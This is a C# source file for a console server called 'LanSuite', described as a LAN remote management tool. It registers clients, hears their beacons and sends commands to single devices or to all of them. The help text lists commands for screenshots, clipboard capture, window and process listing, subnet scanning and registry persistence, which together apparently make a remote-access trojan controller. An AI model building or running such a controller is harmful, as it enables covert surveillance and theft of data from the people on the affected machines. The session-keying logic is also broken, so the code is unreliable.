using System.Net;
using System.Net.Sockets;
using System.Text;
using LanSuite.Shared;

namespace LanSuite.Server;

class Program
{
    private const int ListenPort = 50000;
    private const int BroadcastPort = 50001;
    internal static readonly Dictionary<string, ClientSession> _clients = new();
    private static TcpListener? _listener;
    private static UdpClient? _udp;
    private static CancellationTokenSource _cts = new();

    static void Main(string[] args)
    {
        Console.OutputEncoding = Encoding.UTF8;
        Console.Title = "LanSuite Server";
        PrintBanner();

        _listener = new TcpListener(IPAddress.Any, ListenPort);
        _listener.Start();
        Log($"TCP 监听端口: {ListenPort}");

        _udp = new UdpClient(BroadcastPort);
        _ = ListenBroadcastAsync();
        _ = AcceptConnectionsAsync();

        while (true)
        {
            Console.Write("\x1B[36m>\x1B[0m ");
            var input = Console.ReadLine()?.Trim();
            if (string.IsNullOrEmpty(input)) continue;

            var parts = input.Split(' ', 2);
            var cmd = parts[0].ToLower();
            var arg = parts.Length > 1 ? parts[1] : "";

            switch (cmd)
            {
                case "help": case "h": ShowHelp(); break;
                case "clients": case "c": ShowClients(); break;
                case "send": case "s":
                    if (string.IsNullOrEmpty(arg)) { Log("用法: send <deviceId> <command>"); break; }
                    var sp = arg.Split(' ', 2);
                    if (sp.Length < 2) { Log("用法: send <deviceId> <command>"); break; }
                    SendToClient(sp[0], sp[1]);
                    break;
                case "broadcast": case "b": BroadcastCommand(arg); break;
                case "clear": Console.Clear(); break;
                case "quit": case "exit": _cts.Cancel(); return;
                default: Log($"未知命令: {cmd} (输入 'help' 查看帮助)"); break;
            }
        }
    }

    static async Task AcceptConnectionsAsync()
    {
        while (_listener != null && _listener.Server.IsBound)
        {
            try
            {
                var tcp = await _listener.AcceptTcpClientAsync();
                tcp.NoDelay = true;
                var session = new ClientSession(tcp);
                _clients[session.DeviceId] = session;
                Log($"新客户端: {session.DeviceId} @ {tcp.Client.RemoteEndPoint}");
                _ = session.HandleMessagesAsync();
            }
            catch (Exception ex) when (!_cts.IsCancellationRequested)
            { Log($"Accept error: {ex.Message}"); }
        }
    }

    static async Task ListenBroadcastAsync()
    {
        while (!_cts.IsCancellationRequested)
        {
            try
            {
                var result = await _udp!.ReceiveAsync();
                var text = Encoding.UTF8.GetString(result.Buffer);
                if (text.StartsWith("LANCLIENT_BEACON:"))
                {
                    var parts = text.Substring(17).Split(':');
                    if (parts.Length >= 3 && !_clients.ContainsKey(parts[0]))
                        Log($"发现设备: {parts[0]} @ {parts[1]}:{parts[2]}");
                }
            }
            catch { break; }
        }
    }

    static void SendToClient(string deviceId, string command)
    {
        if (_clients.TryGetValue(deviceId, out var s) && s.Channel != null)
        {
            s.Channel.Send(new MessagePack(FrameTypes.Cmd, $"CMD:{command}"));
            Log($"已发送 -> {deviceId}: {command}");
        }
        else Log($"设备 {deviceId} 未连接");
    }

    static void BroadcastCommand(string command)
    {
        var count = 0;
        foreach (var s in _clients.Values)
            if (s.Channel != null) { s.Channel.Send(new MessagePack(FrameTypes.Cmd, $"CMD:*:{command}")); count++; }
        Log($"广播命令到 {count} 台设备: {command}");
    }

    static void ShowClients()
    {
        if (_clients.Count == 0) { Log("暂无连接的客户端"); return; }
        Console.ForegroundColor = ConsoleColor.Yellow;
        Console.WriteLine($"已连接客户端 ({_clients.Count}):");
        Console.ResetColor();
        foreach (var (id, s) in _clients)
            Console.WriteLine($"  [{id}] {(s.Channel?.IsConnected == true ? "\x1B[32m在线\x1B[0m" : "\x1B[31m离线\x1B[0m")}  {s.Channel?.RemoteAddr ?? ""}");
    }

    static void ShowHelp()
    {
        Console.ForegroundColor = ConsoleColor.Cyan;
        Console.WriteLine(@"可用命令:
  help              显示此帮助
  clients           显示已连接客户端列表
  send <id> <cmd>   向指定客户端发送命令
  broadcast <cmd>   向所有客户端广播命令
  clear             清屏
  quit              退出服务器

常用命令示例:
  send <id> get_system_info
  send <id> get_processes
  send <id> get_windows
  send <id> screenshots
  send <id> clipboard_get
  send <id> tts_speak Hello
  send <id> network_scan 192.168.1 1 254
  send <id> reg_persistence
  broadcast get_system_info");
        Console.ResetColor();
    }

    static void PrintBanner()
    {
        Console.ForegroundColor = ConsoleColor.Cyan;
        Console.WriteLine(@"╔══════════════════════════════════════════╗
║   LanSuite Server - 局域网远程管理       ║
║        仅含合法企业远程管理功能           ║
╚══════════════════════════════════════════╝");
        Console.ResetColor();
    }

    internal static void Log(string msg)
    {
        var line = $"[{DateTime.Now:HH:mm:ss}] {msg}";
        Console.ForegroundColor = ConsoleColor.Gray;
        Console.WriteLine(line);
        File.AppendAllText(Path.Combine(Path.GetTempPath(), "LanSuite_server.log"), line + "\n", Encoding.UTF8);
    }
}

class ClientSession
{
    public string DeviceId { get; set; } = "unknown";
    public MessageChannel? Channel { get; private set; }
    private readonly TcpClient _tcp;

    public ClientSession(TcpClient tcp) { _tcp = tcp; }

    public async Task HandleMessagesAsync()
    {
        try
        {
            Channel = new MessageChannel(_tcp);
            Channel.OnMessage += OnMessage;
            while (Channel.IsConnected) await Task.Delay(1000);
        }
        catch { }
        finally
        {
            Program._clients.Remove(DeviceId);
            Program.Log($"客户端断开: {DeviceId}");
        }
    }

    void OnMessage(MessagePack msg)
    {
        var text = msg.Text;
        if (text.StartsWith("HELLO:"))
        {
            DeviceId = text.Substring(6);
            Program.Log($"设备注册: {DeviceId}");
        }
        else if (text.StartsWith("ACK:"))
        {
            DeviceId = text.Substring(4);
        }
        else if (text.StartsWith("DATA:"))
        {
            var parts = text.Substring(5).Split(':', 3);
            if (parts.Length >= 2)
            {
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine($"<<< [{parts[0]}] {(parts.Length > 2 ? parts[2] : parts[1])}");
                Console.ResetColor();
            }
        }
    }
}
